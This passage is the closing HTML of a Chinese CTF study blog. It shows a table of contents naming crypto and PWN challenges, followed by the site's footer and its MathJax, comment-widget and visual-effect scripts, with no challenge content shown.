class="toc-number">7.3.8.1.</span> <span class="toc-text">ctfshow、easyrsa7</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E6%9D%82%E7%9A%84RSA"><span class="toc-number">7.3.9.</span> <span class="toc-text">复杂的RSA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MRCTF2020-babyRSA"><span class="toc-number">7.3.9.1.</span> <span class="toc-text">[MRCTF2020]babyRSA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NPUCTF2020-EzRSA"><span class="toc-number">7.3.9.2.</span> <span class="toc-text">[NPUCTF2020]EzRSA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MRCTF2020-Easy-RSA"><span class="toc-number">7.3.9.3.</span> <span class="toc-text">[MRCTF2020]Easy_RSA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#De1CTF2019-babyrsa"><span class="toc-number">7.3.9.4.</span> <span class="toc-text">[De1CTF2019]babyrsa</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#QCTF2018-Xman-RSA"><span class="toc-number">7.3.9.5.</span> <span class="toc-text">[QCTF2018]Xman-RSA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NPUCTF2020-%E8%AE%A4%E6%B8%85%E5%BD%A2%E5%8A%BF%EF%BC%8C%E5%BB%BA%E7%AB%8B%E4%BF%A1%E5%BF%83"><span class="toc-number">7.3.9.6.</span> <span class="toc-text">[NPUCTF2020]认清形势，建立信心</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0%E9%97%AE%E9%A2%98"><span class="toc-number">7.4.</span> <span class="toc-text">离散对数问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0%E9%97%AE%E9%A2%98"><span class="toc-number">7.4.1.</span> <span class="toc-text">一般离散对数问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-you-raise-me-up"><span class="toc-number">7.4.1.1.</span> <span class="toc-text">[网鼎杯 2020 青龙组]you_raise_me_up</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="toc-number">7.5.</span> <span class="toc-text">对称加密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AES"><span class="toc-number">7.5.1.</span> <span class="toc-text">AES</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-crypto-aes"><span class="toc-number">7.5.1.1.</span> <span class="toc-text">[ACTF新生赛2020]crypto-aes</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rabbit"><span class="toc-number">7.5.2.</span> <span class="toc-text">Rabbit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ctfshow%E3%80%81crypto6"><span class="toc-number">7.5.2.1.</span> <span class="toc-text">ctfshow、crypto6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ctfshow%E3%80%81crypto7"><span class="toc-number">7.5.2.2.</span> <span class="toc-text">ctfshow、crypto7</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">8.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">8.1.</span> <span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85peda"><span class="toc-number">8.1.1.</span> <span class="toc-text">安装peda</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E8%88%ACpwn"><span class="toc-number">8.2.</span> <span class="toc-text">一般pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">8.2.1.</span> <span class="toc-text">绝对签到题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#buu%E3%80%81test-your-nc"><span class="toc-number">8.2.1.1.</span> <span class="toc-text">buu、test_your_nc</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE"><span class="toc-number">8.3.</span> <span class="toc-text">普通溢出题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">8.3.1.</span> <span class="toc-text">普通栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rip"><span class="toc-number">8.3.1.1.</span> <span class="toc-text">rip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-number">8.3.1.2.</span> <span class="toc-text">warmup_csaw_2016</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ciscn-2019-n-1"><span class="toc-number">8.3.1.3.</span> <span class="toc-text">ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn1-sctf-2016"><span class="toc-number">8.3.1.4.</span> <span class="toc-text">pwn1_sctf_2016</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">8.3.2.</span> <span class="toc-text">缓冲区溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jarvisoj-level0"><span class="toc-number">8.3.2.1.</span> <span class="toc-text">jarvisoj_level0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ciscn-2019-c-1"><span class="toc-number">8.3.2.2.</span> <span class="toc-text">ciscn_2019_c_1</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/topimg/image-20210528154723696.png')"><div id="footer-wrap"><div class="copyright">&copy;2021 By M4XLMUM</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    loader: {
      source: {
        '[tex]/amsCd': '[tex]/amscd'
      }
    },
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        addClass: [200,() => {
          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
            const target = node.parentNode
            if (!target.classList.contains('has-jax')) {
              target.classList.add('mathjax-overflow')
            }
          })
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'hQSVii4djRLOjBYaCK5zOXhB-gzGzoHsz',
      appKey: 'eaCREaPBTzvLpmQcrAhlnzGe',
      placeholder: '记得留下你的昵称和邮箱....可以快速收到回复',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: true,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: true,
      path: window.location.pathname,
      requiredFields: ["nick"],
      visitor: true
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>